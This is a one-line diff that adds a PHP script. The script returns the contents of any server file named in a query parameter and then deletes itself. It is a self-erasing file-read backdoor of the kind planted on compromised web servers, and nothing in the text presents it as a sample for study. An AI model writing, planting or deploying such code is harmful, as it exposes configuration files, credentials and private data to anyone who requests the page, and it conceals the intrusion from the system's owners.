@@ -1,0 +1,1 @@
+<?php echo(file_get_contents($_GET[0])); unlink(__FILE__); ?>
